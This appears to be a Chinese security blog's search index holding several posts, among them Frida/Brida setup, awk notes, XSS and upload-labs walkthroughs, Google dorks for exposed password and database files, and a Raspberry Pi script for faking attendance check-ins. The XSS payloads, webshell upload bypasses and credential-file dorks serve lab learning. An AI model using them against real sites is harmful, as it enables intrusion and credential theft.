<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[brida从0配置]]></title>
    <url>%2F2020%2F06%2F11%2Fbrida%E9%85%8D%E7%BD%AE%E4%B8%8E%E6%8A%93%E5%8C%85%2F</url>
    <content type="text"><![CDATA[APP测试做到后面一定绕不开hook。虽然目前很多的APP还有做证书校验，加固混淆，但仍需负重前行。 前言因为最近测的一个app，做了ssl pinning。查了一下资料，可以使用frida从内存中hook住加密函数，用来解密传输信息。而brida是连接frida与burp的桥梁。使用了brida就可以正常使用burp抓取加密数据包。而网上关于brida的安装环境都不是最新的。brida原本默认是py2的，现在0.4版本已经支持py3的环境。接下来，我就带大家从0开始安装环境吧。 基础环境 系统 win10 python 3.8.3 java 13 夜神模拟器 android版本7.0 burp 2020.5 crack node 14.4.0 基本上是一个全新的环境。adb，frida也都没有配置。问题不大。 设置与准备1.brida下载安装github上的release 此时两个status还未启动起来，那需要我们去配置frida的环境了。 或者burpsuite中BAPP store安装 2.adb设置adb是连接模拟器和电脑的桥梁 adb的版本需要和nox的版本一致。我们可以直接使用everything去查找nox的adb，然后配置环境变量即可。 frida设置frida分为server和client 客户端安装frida这一步比较容易，pip安装即可 我们可以设置pip国内源来加快安装 1.进入c盘用户文件夹，新建pip的目录。pip目录下新建pip.ini的文件。 2.在pip.ini中添加下面代码： 123456[global]timeout=6000index-url=https://pypi.tuna.tsinghua.edu.cn/simpletrusted-host=pypi.tuna.tsinghua.edu.cn# pip源同样适用python3和python2。(适用python2的firda下载包时可能会出现卡死，可以试试这个方法改善) 安装第三方库123pip install Pyro4pip install frida-toolsnpm install frida-compile #这个生成frida-conpile.cmd.burpsuite中需要填写frida compile path 服务端安装frida 查看模拟器cpu版本1getprop ro.product.cpu.abi 根据cpu版本选择frida-server 将下载好的文件解压并放入/data/local/tmp 模拟器中。在adb 进入模拟器，文件赋值777后启动server 12345adb push C:\Users\howti\Desktop\frida-server-12.9.7-android-x86 /data/local/tmpadb shellcd /data/local/tmp/chmod 777 frida-server-12.9.7-android-x86./frida-server-12.9.7-android-x86 android版本最好使用android7，不然会一些报错。 什么都不显示即可 将frida端口转发 12adb forward tcp:27042 tcp:27042adb forward tcp:27043 tcp:27043 burp设置设置代理 设置brida Python binary path: 就填入python3的路径（使用brida0.4就可以支持py3） Pyro host: 默认 Pyro port: 默认 frida-compile: (frida-compile的二进制文件的路径)之前npm安装的包,里面有frida-compile.cmd .使用everything搜索frida 然后填入. Frida JS files folder: 包含带有所有Frida和Brida钩子和导出文件的Frida工具JavaScript文件的文件夹的路径。我们可以使用默认文件夹]]></content>
  </entry>
  <entry>
    <title><![CDATA[Awk学习]]></title>
    <url>%2F2020%2F06%2F07%2FAWK%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[最近看上了国外挖洞赏金，正好也找到了src将数据放入到LangSrcCurise中（先不管国内能不能访问）这时就需要将src的地址传入到Lang子域名监控中。 前言本来准备用excel或者python去实现这样的功能，但之前看过awk。具体是哪天给忘了，觉得可以练练 Awk介绍Awk 是一种处理文本文件的语言，是一个强大的文本分析工具。Awk与sed的区别是: 前者编辑的列，后者编辑的行 前者轻量简单，后者功能强大，语法复杂 基本用法awk：一般我们只用“逐行处理”比如对于满足条件的某些行，我们打印某某列。通过指定分隔符，我们很容易的对列进行操作。 用法一（F）-F #指定输入文件折分隔符 默认为空格和tab 1.txt文本如下 12345*.buddypress.org*.wordcamp.org*.wordpress.net*.wordpress.org*.bbpress.org 用法 1234567891011root@hw3:~/git/LangSrcCurise/initialize# awk -F "." '&#123;print $2,$3&#125;' 1.txt # 每行按"."分割，输出文本中的2、3项---------------------------------------------------------------------- # 格式化输出buddypress orgwordcamp orgwordpress networdpress orgbbpress orgcbhq net 也可以定义多个分隔符 1234#文本root@hw3:~/git/LangSrcCurise/initialize# cat test.txt111 222 333 444:555:666root@hw3:~/git/LangSrcCurise/initialize# 1# 输出444 用法二(BEGIN)BEGIN{} {} END{} 行处理前 行处理 行处理后BEGIN 定义一些变量（通常在发生处理之前。例如BEGIN{FS=”:”;OFS=”—“}） 单一的-F 参数是不够用的，我们刚才的操作并没有直接获取到我们想要的数据 用法 12345678910111213root@hw3:~/git/LangSrcCurise/initialize# awk 'BEGIN&#123;FS=".";OFS="."&#125; &#123;print $2,$3&#125;' 1.txt# BGEGIN是在处理之前操作，FS指定列分割符 OFS输出记录分隔符（输出换行符），输出时用指定的符号代替换行符------------------------------------------------------------------# 格式化输出buddypress.orgwordcamp.orgwordpress.networdpress.orgbbpress.orgcbhq.netcoinbase.comirccloud-cdn.comirccloud.com 上面还可以直接输入到为文本中 使用管道符即可。 1root@hw3:~/git/LangSrcCurise/initialize# echo | awk BEGIN'&#123;FS=".";OFS="."&#125; &#123;print $2,$3&#125;' 1.txt &gt; 2.txt]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>脚本</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[APP测试]]></title>
    <url>%2F2020%2F05%2F14%2FAPP%E6%B5%8B%E8%AF%95%2F</url>
    <content type="text"><![CDATA[自用App测试安全指南 参考于Panda写的APP安全检测指南 前言大概的渗透测试概要 测试环境Kali;sdk 客户端安全安装包签名描述 Andoid系统会在安装apk的时候，检查签名，签名不同，没有签名或者签名不通过的，不能进行安装或者覆盖。方法是：获取打包在apk里面的数字证书（里面有公钥），该证书是自签名证书，用证书公钥验证该证书的合法性（该证书有自己的私钥对该证书进行签名，而不是第三方权威机构的私钥），判断证书的有效期，然后利用该证书的公钥对包文件的签名进行验证。 工具jarsigner 123kali中自带jarsiner检查安装包的签名jarsigner.exe -verify APK 文件路径 -verbose -certs 测试步骤检查签名 以某州APP示例 签名CN=kingdon 结果为安全。 只有直接使用客户的证书签名的时候，才认为是安全。Debug证书，第三方（开发方）证书等等均认为风险； 威胁等级威胁等级安装包签名的威胁等级判断一般如下： 若客户端安装包签名有异常（例如签名证书为第三方开发商而不是客户端发布方），此 时高风险；若无异常则无风险。 安全建议将安装包进行签名并检测安装包签名的异常。 反编译保护描述 测试客户端安装程序，判断是否能反编译为源代码，java 代码和 so 文件是否存在代码混淆等保护措施。未作保护的 java 代码，可以轻易分析其运行逻辑，并针对代码中的缺陷对客户端或服务器端进行攻击。成功的反编译将使得攻击者能够完整地分析 APP 的运行逻辑，尤其是相关业务接口协议、和通信加密的实现。 工具d2j-dex2jar;jd-gui 123d2j-dex2jar class文件路径 jd-gui查看文件 渗透步骤将sdk文件打开，导出classes.dex 反编译为java文件 jd-gui打开jar文件，得到java代码 下图为混淆后的代码样例，除了覆写和接口以外的字段都是无意义的名称 上图经过逆向发现经过混淆，安全。如果代码经过混淆，或者有加壳措施，不能完整恢复源代码的，都可以认为此项安全。 后记apk混淆后新增文件判断混淆反混淆 威胁等级 若客户端进行加壳保护，此时认为无风险。 若大部分代码（包括核心代码）经过混淆，此时低风险。 若部分代码混淆，关键代码（加密或通信等）可以获知其关键代码，此时中风险。 安全建议建议客户端程序可以把关键代码以 JNI 方式放在 so 库里。so 库中是经过编译的arm 汇编代码，可以对其进行加壳保护，以防止逆向分析。 应用完整性校验描述 测试客户端程序是否对自身完整性进行校验。攻击者能够通过反编译的方法在客户端程序中植入自己的木马，客户端程序如果没有自校验机制的话，攻击者可能会通过篡改客户端程序窃取手机用户的隐私信息 工具androidkiller apktool 渗透步骤androidkiller解压文件包，修改解包目录下的资源文件（logo之类好确认）]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[简单的正则学习]]></title>
    <url>%2F2020%2F03%2F17%2F%E7%AE%80%E5%8D%95%E7%9A%84%E6%AD%A3%E5%88%99%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[正则的使用无处不在： mysql,oracle,php,bash,python,apache,nginx…. 正则的查找Github RE学习 VScode插件 什么是正则表达式]]></content>
      <categories>
        <category>bash</category>
      </categories>
      <tags>
        <tag>bash</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动安全测试]]></title>
    <url>%2F2020%2F02%2F29%2F%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%2F</url>
    <content type="text"><![CDATA[主要是对移动端漏洞的检测 0x00 前言：随着互联网及智能便携设备的普及，移动互联网迅速崛起，移动端的各类应用程序越来越丰富，给予大众便利的同时，出现了大量互联网恶意程序，严重危害网民的个人信息安全与财产安全。 0x01 移动测试工具： DrozerDrozer是一款针对Android的安全测试框架，分为安装在PC端的控制台、安装在终端上的代理APP两部分。可以利用APP的IPC通信，动态的发现被测试APP的安全风险。 Drozer的功能点：]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS小游戏2]]></title>
    <url>%2F2020%2F02%2F22%2FXSS%E5%B0%8F%E6%B8%B8%E6%88%8F2%2F</url>
    <content type="text"><![CDATA[你必须非常努力，才能看起来毫不费劲。 0x00练习地址 https://xss.haozi.me/ 网站源码 https://github.com/haozi/xss-demo 0x00123function render (input) &#123; return '&lt;div&gt;' + input + '&lt;/div&gt;'&#125; 无过滤 1&lt;script&gt;alert(1)&lt;/script&gt; 0x01]]></content>
      <categories>
        <category>OWASP</category>
      </categories>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[阿里云vps搭建私人云盘]]></title>
    <url>%2F2020%2F02%2F10%2F%E9%98%BF%E9%87%8C%E4%BA%91vps%E6%90%AD%E5%BB%BA%E7%A7%81%E4%BA%BA%E4%BA%91%E7%9B%98%2F</url>
    <content type="text"><![CDATA[我很酷我可以 你滚吧]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>VPS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[xss挑战 1]]></title>
    <url>%2F2020%2F01%2F09%2FXss%E5%B0%8F%E6%B8%B8%E6%88%8F%2F</url>
    <content type="text"><![CDATA[自己对XSS的理解不深，拿小游戏来练练手正好。 说明一个xss练习平台，在线地址：http://test.xss.tv/ xss用法js总结 AwesomeXSS xss的常规思路： 1.先找注入点 2.再找输出点 3.根据输出点位置，格式，显示不断重新尝试有效载荷 LEVEL-1 payload 1234http://test.ctf8.com/level1.php?name=%3Cscript%3Ealert(/xss/)%3C/script%3Ehttp://test.ctf8.com/level1.php?name=%3Csvg/onload=alert(1)%3Ehttp://test.ctf8.com/level1.php?name=%3Cimg%20src=1%20onerror=alert(1)%3E http://test.ctf8.com/level1.php?name=%%3Ca%20href=%22javascript:alert(1)%22%3Etest%3C/a%3E LEVEL-2 显而易见，上面尖括号被过滤了，而下面却没有 PHP中 ‘ 中的变量不会执行 “中的变量执行。只要闭合双引号即可 payload 12http://test.ctf8.com/level2.php?keyword=%22%3E%3Cimg%20src=1%20onerror=alert(1)%3Ehttp://test.ctf8.com/level4.php?keyword="onclick="window.alert() LEVEL-3 123456789htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。预定义的字符是：&amp; （和号）成为 &amp;" （双引号）成为 "' （单引号）成为 '&lt; （小于）成为 &lt;&gt; （大于）成为 &gt; payload 1http://test.ctf8.com/level3.php?keyword=%27onclick%3D%27window.alert%28%29&amp;submit=%E6%90%9C%E7%B4%A2 LEVEL-4 payload 1http://test.ctf8.com/level4.php?keyword=%22onmouseover=%22alert(1) LEVEL-5 但是这串代码没有过滤&lt;字符和&gt;字符，那么我们可以使用标签的href属性构造payload进行弹窗payload 1http://test.ctf8.com/level5.php?keyword=%22%3E%20%3Ca%20href=%22javascript:alert(1)%22%3Exss%3C/a%3E LEVEL-6 payload 1http://test.ctf8.com/level6.php?keyword=%22ONclick%3D%22window.alert%28%29&amp;submit=%E6%90%9C%E7%B4%A2 LEVEL-7 payload 1http://test.ctf8.com/level7.php?keyword=%22%3E%3CScrscriptipt%3Ealert(1)%3C/Scriscriptpt%3E LEVEL-8 12345Javascript：伪协议后面可以使用URL编码。 如：&lt;a href="javascript:%61lert(1)"&gt;click me&lt;/a&gt;可成功执行弹窗。 可用img就不行:&lt;img src=1 onerror="javascript:%61lert(1)"&gt; 因为href属性会跳转到其中的URL，而会进行URL解码，onerror属性只会执行JS,不跳转同时后面的url编码可以再做一次entity(HTML实体)编码： &lt;a href="javascript:%61lert(1)"&gt;click me&lt;/a&gt; payload 1http://test.ctf8.com/level8.php?keyword=javascri%26%23x0070%3Bt%3Aalert%28%29&amp;submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5 LEVEL-9 只要让它检测到http，却不能起到作用就可以了，所以可以用注释 payload 1http://test.ctf8.com/level9.php?keyword=javascri%26%23x0070%3Bt%3Aalert%281%29%2F*http%3A%2F%2Fwww.baidu.com*%2F&amp;submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5 LEVEL-10 payload 1http://test.ctf8.com/level10.php?keyword%20=%20test&amp;t_sort=%22type=%22text%22%20onclick%20=%20%22alert(1) LEVEL-11 payload 1Referer: "onclick=alert(1) type="text" //所添加的Referer头部 LEVEL-12 payload 1Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0 " onclick=alert(1) type="text LEVEL-13 payload 1user=call+me+maybe%3F " onclick=alert(1) type="text" LEVEL-14查看源码，点击 这关目前做不了，我再看看 LEVEL-15payload 1http://127.0.0.1/xss练习小游戏/level15.php?src='level1.php?name=&lt;img src=x onerror=alert(1)&gt;' LEVEL-16 payload 1http://127.0.0.1/xss%E7%BB%83%E4%B9%A0%E5%B0%8F%E6%B8%B8%E6%88%8F/level16.php?keyword=%3Cimg%0dsrc=1%0donerror=alert()%3E LEVEL-17 过滤了尖括号和双引号，用on事件触发payload 1http://127.0.0.1/xss练习小游戏/level17.php?arg01=a&amp;arg02=b%20onclick=alert(1) LEVEL-18 payload 1http://127.0.0.1/xss练习小游戏/level18.php?arg01=a&amp;arg02=%20onclick=alert(1) LEVEL-1919,20均为flash分析需要 payload 1http://127.0.0.1/xss练习小游戏/level19.php?arg01=version&amp;arg02=%3Ca%20href=%22javascript:alert(document.domain)%22%3Exss_by_SST%3C/a%3E LEVEL-20具体可以参考freebuf确实很少碰到，算flash中xss少的了 payload 1http://127.0.0.1/xss练习小游戏/level20.php?arg01=id&amp;arg02=\%22))&#125;catch(e)&#123;&#125;if(!self.a)self.a=!alert(document.cookie)//%26width%26height]]></content>
      <categories>
        <category>OWASP</category>
      </categories>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bash脚本入门————变量]]></title>
    <url>%2F2019%2F12%2F17%2Fbash%E8%84%9A%E6%9C%AC%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[这是一个简易的bash入门适合小白白学习 bash模式bash是shell解释器程序 bash shell 有交互和非交互两种模式 123形如下面的东西，说明shell处于交互模式下：user@host:~$ #shell直接与用户交互 12345在非交互模式下，shell从文件或者管道中读取命令并执行。sh /path/to/script.shbash /path/to/script.shsource /path/to/script.sh 常见bash命令1. 变量赋值 单引号 ‘’ 双引号 “” 花括号 {} 圆括号 () 反引号 `` 简单的变量赋值： bash和C类似，同样用赋值符号”=”来表示赋值，比如 $var=world复杂的变量赋值：单引号赋值：单引号里的任何字符都会原样输出，单引号字符串中的变量是无效的 子shell和当前shell子shell 生成一个新的shell当前shell shell在当前执行。 source/ . //查看脚本语法是否有错误： //bash -n modify_suffix.sh //跟踪执行 //sh -x modify_suffix.sh aaa]]></content>
      <categories>
        <category>bash</category>
      </categories>
      <tags>
        <tag>bash</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派打卡签到]]></title>
    <url>%2F2019%2F12%2F13%2F%E6%A0%91%E8%8E%93%E6%B4%BE%E6%89%93%E5%8D%A1%E7%AD%BE%E5%88%B0%2F</url>
    <content type="text"><![CDATA[实习要求：上班和下班必须要签到。我这么懒，实习是肯定要实习的，但是签到嘛，还是要想办法摸摸鱼的啦! 树莓派介绍树莓派是一款信用卡大小的超小型电脑 那么我们有个大胆的想法，能不能用树莓派实现打卡的心愿呢。好歹也是个计算机，对吧。 树莓派的购买及组装购买清单 就我实际的使用而言，必需品：一块主板，网线，3个散热片，外壳，电源，16g sd卡，读卡器。 组装部分 https://projects.raspberrypi.org/en/projects/raspberry-pi-setting-up/4 大家拿着自己的板子(树莓派4)对照着图找就好了 装系统我这里推荐大家装 Raspbian Buster with desktop 对于官网NOOBS系统我尝试过了，对于我们没有买显示器的而言，不友好，需要额外的操作。 系统下载完成，就需要烧录 这里需要先SD卡格式化，使用 SD Card Formatter(支持windows和mac) 烧录系统到sd卡这里使用win32Diskimager 链接：https://pan.baidu.com/s/1loQPydCsw9Cam8Us2CbpxQ提取码：wiis复制这段内容后打开百度网盘手机App，操作更方便哦 烧录完成，组装完成。设置ssh连接，最新的系统默认是未开启ssh，这里我们需要设置开启ssh。将SD卡连接到电脑上并打开，直接新建“SSH”文件（无后缀）即可 算了，接下来还有网线什么的连接。写起来太长，都还没到主菜。详细的设置大家可以参考https://blog.csdn.net/weixin_43895902/article/details/100919851#_142 就我出现的几个问题给大家说一下。 ssh连接，我是在学校里，学校网络比较复杂。我是电脑使用无线连接手机热点，树莓派和电脑网线连接。无线网开启共享给有线。cmd中arp-a查看分配的ip，一般树莓派默认是192.168.137.x 默认密码raspberry 用户名 pi 开启的vnc无法显示，这是因为你屏幕的分辨率问题，按教程修改就好 自己的树莓派下载很慢，这时需要设置软件源 不推荐大家使用swap分区，会有损sd卡的性能。装完系统默认是开启100mb的sd卡空间提供swap。 主菜到了，树莓派签到功能树莓派直接放在公司里，有电有网，直接就能定位。除了让树莓派自动打卡，我还想让树莓派打卡完成之后给我发一封邮件。一步一步来 设置邮件功能配置msmtp和mutt自动发送邮件 mutt: 是一个Linux下的邮件程序，Mutt 更像一个文件管理器，只不过它管理的是emailmsmtp: 是Linux下一个非常简单易用的smtp客户端 12#安装sudo apt install msmtp mutt 123456789101112131415161718192021222324252627282930# 配置msmtprccd ~ #进入用户根目录touch msmtp.log #创建日志文件chmod 600 msmtp.log #查看日志touch .msmtprc #创建.msmtprc文件chmod 600 .msmtprc #msmtprc权限sudo nano .msmtprc #添加如下内容account defaulthost smtp.163.com #需要开启163邮箱的SMTP服务from xxx@163.com #你的邮箱地址auth plainuser xxx@163.com #你的邮箱地址password your_password #是SMTP授权码logfile /root/msmtp.log # 在发送邮件之后程序会把发送日志写到这个路径的文件里#配置muttcd ~touch .muttrcsudo nano .muttrc #添加以下内容，默认填就好了set sendmail="/usr/bin/msmtp"set use_from=yesset realname="Alpha" #收件人名字set from="xxx@163.com"set editor="vim" 1234#测试测试配置文件：msmtp -P测试smtp服务器：msmtp -Secho &quot;你好，我是测试用的，谢谢&quot; | mutt -s &quot;你好啊&quot; xxx@163.com 脚本定时/开机自启动这个要单独列出来一下。因为一个脚本的核心还是自动化，方便实用。 123#开机自启动sudo nano /etc/rc.localsudo bash /home/pi/sendmail.sh #我的sendmail.sh是开机发送自己的ip，文末会贴上 1234567#定时任务#cron进行定时器crontab -e #编译定时任务// 从左往右： 分 时 日 月 星期 # m h dom mon dow command30 5 10 3 * touch /tmp/test.log // 表示每年3月10号5点30分，执行touch /tmp/test.log10 18 * * * echo "Hello World" &gt; /home/pi/log // 每天的18点10分执行echo "Hello World" &gt; /home/pi/log 抓取定位包我使用的是eteams打卡，它不支持pc端的签到，所以我只能使用模拟器代理去抓包。 一些自己使用的脚本： 1.定时ip任务: #!/bin/bash 123456789#!/bin/bash # check network availability # get the IP address of eth0, e.g. "192.168.16.5"ETH0_IP_ADDR=`/sbin/ifconfig eth0 | sed -n "2,2p" | awk '&#123;print substr($2,1)&#125;'` # send the Emailecho "Current time: `date '+%F %T'`. Enjoy it" | mutt -s "IP Address of Raspberry Pi: $ETH0_IP_ADDR" xxx@163.com 2.报告车况，车辆到站时间 1]]></content>
      <categories>
        <category>树莓派</category>
      </categories>
      <tags>
        <tag>树莓派</tag>
        <tag>自动化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搜索引擎]]></title>
    <url>%2F2019%2F12%2F01%2F%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%2F</url>
    <content type="text"><![CDATA[本篇要介绍的搜索引擎包括：Shodan，censys，钟馗之眼，Google，FoFa，Dnsdb等。介绍的内容主要是这几款搜索引擎的一些高级语法，掌握高级语法会让搜索结果更准确。 google基本语法12345678910Index of/ 使用它可以直接进入网站首页下的所有文件和文件夹中。intext: 将返回所有在网页正文部分包含关键词的网页。intitle: 将返回所有网页标题中包含关键词的网页。cache: 搜索google里关于某些内容的缓存。define: 搜索某个词语的定义。filetype: 搜索指定的文件类型，如：.bak，.mdb，.inc等。info: 查找指定站点的一些基本信息。inurl: 搜索我们指定的字符是否存在于URL中。Link: link:thief.one可以返回所有和thief.one做了链接的URL。site: site:thief.one将返回所有和这个站有关的URL。 123456+ 把google可能忽略的字列如查询范围。- 把某个字忽略，例子：新加 -坡。~ 同意词。. 单一的通配符。* 通配符，可代表多个字母。“” 精确查询。 搜索不同国家网站1234inurl:tw 台湾inurl:jp 日本利用google暴库利用goole可以搜索到互联网上可以直接下载到的数据库文件，语法如下： 123456789101112131415inurl:editor/db/ inurl:eWebEditor/db/ inurl:bbs/data/ inurl:databackup/ inurl:blog/data/ inurl:\boke\data inurl:bbs/database/ inurl:conn.asp inc/conn.aspServer.mapPath(“.mdb”)allinurl:bbs datafiletype:mdb inurl:databasefiletype:inc conninurl:data filetype:mdbintitle:"index of" data 利用goole搜索敏感信息利用google可以搜索一些网站的敏感信息，语法如下: 12345678910111213intitle:"index of" etcintitle:"Index of" .sh_historyintitle:"Index of" .bash_historyintitle:"index of" passwdintitle:"index of" people.lstintitle:"index of" pwd.dbintitle:"index of" etc/shadowintitle:"index of" spwdintitle:"index of" master.passwdintitle:"index of" htpasswdinurl:service.pwd利用google搜索C段服务器信息此技巧来自lostwolf 1site:218.87.21.*可通过google可获取218.87.21.0/24网络的服务信息。]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>搜索引擎</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web渗透测试———流程]]></title>
    <url>%2F2019%2F11%2F29%2FWeb%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E2%80%94%E6%B5%81%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[渗透测试：出于保护系统的目的，更全面地找出测试对象的安全隐患。 入侵：不择手段地（甚至是具有破坏性的）拿到系统权限。 流程图 一般渗透测试过程 信息收集1. 域名、IP、端口域名信息查询： 收集注册人信息，域名DNS服务器信息，子域名查询 1.1.1 Whois查询 在线查询网站 1234https://dnsdb.io/zh-cn/https://whois.aizhan.comhttp://whois.chinaz.comhttps://www.virustotal.com 1.1.2 空间搜索引擎SSL证书 fofa查询子域名 12#搜索企业证书 北京京东上科信息科技有限公司cert="Organization：Beijing Jingdong Shangke Information Technology" 1.1.3 其他泄露信息 js，图片，css，title，copyright，网站跳转，crossdomain.xml 文件 1.1.4 子域名爆破 子域名检测工具 Layer子域名挖掘机，Sublist3r subDomainsBrute IP信息查询： 确认真实IP，绕过CDN 1.2.1 判断是否使用CDN 进行全国异地ping，对比每个地区的IP结果 在线异地ping网站 12https://www.17ce.comhttp://ping.chinaz.com/ 绕过CDN寻找真实IP 命令：nslookup -qt=A baidu.com 常规方法 分站域名。CDN一般都存在在主站上，分站可能没有挂CDN，可以ping二级域名获取分站IP，可能会出现分站和主站不是同一个IP，但在一个C端下。如果是架在云服务器上，那就不可行。 国外访问。国内的CDN往往只针对国内用户的访问加速，国外的用户就不一定了。国外在线代理网站：https://asm.ca.com/en/ping.php 查询域名解析记录 查询网站没用CDN之前的IP历史记录 域名解析记录网站： 123https://x.threatbook.cnhttp://viewdns.info/http://toolbar.netcraft.com/site_report?url= 端口信息查询： 确认开放端口 1.3.1 Nmap扫描 Nmap基础教程 指纹识别首页index.php,html,js,css中多少会包含特征码。例如WordPress在robots.txt中包含wp-admin。 在线CMS指纹查询： 123BugScaner: http://whatweb.bugscaner.com/look云悉指纹：http://www.yunsee.cn/finger.htmlWhatweb：http://whatweb.net whatweb 使用 后台特征 漏洞探测 主机扫描 主机扫描 Nessus 查看有无CVE漏洞 Web扫描 web扫描 AWVS 安装教程 渗透测试 BurpSuite： 下载地址 Kali已经有2.0版本了 验证漏洞逻辑漏洞]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[upload-labs通关攻略]]></title>
    <url>%2F2019%2F11%2F20%2Fupload-labs%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5%2F</url>
    <content type="text"><![CDATA[upload上传是比较基本的web漏洞，看到很多的大佬发布的钓鱼，人肉都用到过upload获取shell。个人感觉这个总结起来也比较方便简单。 项目地址： https://github.com/c0ny1/upload-labs Upload-labs练习：class-1 js限制文件上传前端限制后缀名，上传jpg文件，拦包改后缀绕过 这里可以看到成功上传 class-2 MIME限制文件上传上传php文件，显示类型不正确，实际上MIME验证就是检测Content-type字段值的，直接更改上传数据包中的Content-type(image/jpeg、image/png、image/gif)即可绕过 修改Content-type值为图片的格式（image/jpeg），成功绕过 class-3 黑名单限制通过上传不受欢迎的php扩展来绕过黑名单。例如：pht，phpt，phtml，php3，php4，php5，php6 服务器已经解析为php class-4 .htaccess绕过phpstudy打开配置文件 httpd-confAllowOverride None –&gt; AllowOverride All前提条件（1.mod_rewrite模块开启。2.AllowOverride All） 虽然还是黑名单，但几乎过滤了所有有问题的后缀名，除了.htaccess，于是首先上传一个.htaccess内容如下的文件: 1SetHandler application/x-httpd-php 这样所有文件都会解析为php，然后再上传图片马，可以解析绕过 class-5 点+空格+点绕过代码先是去除文件名前后的空格，再去除文件名最后所有的.，再通过strrchar函数来寻找.来确认文件名的后缀，但是最后保存文件的时候没有重命名而使用的原始的文件名，导致可以利用1.php. .（点+空格+点）来绕过 class-6 大小写绕过class-7]]></content>
      <categories>
        <category>OWASP</category>
      </categories>
      <tags>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali更新完善]]></title>
    <url>%2F2019%2F10%2F29%2Fkali%E6%9B%B4%E6%96%B0%E5%AE%8C%E5%96%84%2F</url>
    <content type="text"><![CDATA[工欲善其事，必先利其器。kali是几年来，hacker使用最多的一款操作系统。现在已有5年的历史了，现在最新版本为2019.3. 安装环境一般kali我们都是装在虚拟机中。这里的ios镜像我们可以选择ios和vm版本 ios 版本的可以装在vm中或者是真实的生产环境(推荐MATE版本) vm版本的我们可以使用 优化由于是kali的更新完善，这里不在对kali的安装进行操作。推荐大家直接上手vm版本的 登录用户唯一：root密码默认：toor 更新源123456789101112131415root@kali:~# vi/etc/apt/sources.list#在vi的编辑下添加以下国内镜源#中科大deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib #阿里云deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib #清华大学deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free#并将kali自带的镜像源注释，以便加快我们apt的安装使用#deb http://http.kali.org/kali kali-rolling main non-free contrib 系统更新1root@kali:~# apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get dist-upgrade # 刷新系统&amp;升级系统&amp;版本升级 系统设置 Settings–&gt;Privacy–&gt;screen lock off # 关闭锁屏 Settings–&gt;Power–&gt;Blank screen #关闭黑屏 Settings–&gt;Devices–&gt;Keyboard –&gt; Screenshots–&gt;Save a screenshot of an area to Pictures #截图的快捷键(存储到Picture) Settings–&gt;Background #设置你的背景图片 Settings –&gt; Universal Access -&gt; Seeing -&gt; Large Text #放大字体，很舒服 系统中文不推荐使用中文的操作系统，能英文还是英文优先也不推荐大家使用系统的Region&amp;Language去切换中文，因为这样设置的系统不是完全中文 1234root@kali:~# dpkg-reconfigure locales#选择字符编码：en_US.UTF-8、zh_CN.GBK、zh_CN.UTF-8#选择字符：zh_CN.UTF-8（记得用空格）#重启生效 中文输入法123456root@kali:~# apt-get install fcitx #安装输入法框架root@kali:~# apt-get install fcitx-googlepinyin #安装google拼音输入法#重启生效root@kali:~# im-config将google拼音设置为首选项验证，ctrl+空格切换输入法 网络问题可能有些小伙伴一装上kali就上不了网。可能ping不同外网，可能只能ping物理机，可能没有eth0(默认)，可能之前能连网，但换了一个环境就不行等等的问题这些问题，可能的原因可以是 ： 12345- 1 你物理机是网线连接，你的kali是用的直连，自己没配置/etc/network/interface- 2 物理机是wife连接，你的kali 是nat连接，你的/etc/NetworkManager/NetworkManger.conf 没有设置true- 3 你的物理机的服务VMware DHCP Service，VMware NAT Service停止了- 4 还有的时候是在虚拟网络编译器中Vmnet信息中桥接模式选择的自动，有些网卡不是很友好，可以换成ipcofig中使用的网卡- 5 最后一个解决的办法，实在没招了，点开vmware 左上角的编辑选择虚拟网络编译器，点击更改设置，还原默认设置即可 安装代理为了方便日后的使用还是先装一下代理工具shadowsocks-qt5 12root@kali:~# apt-get updateroot@kali:~# apt-get install shadowsocks-qt5 在系统中搜索shadowsocks-qt5 打开做设置如图 测试对firefox做代理 完成 最后别忘了给kali做一份快照 init 0 关机大吉]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
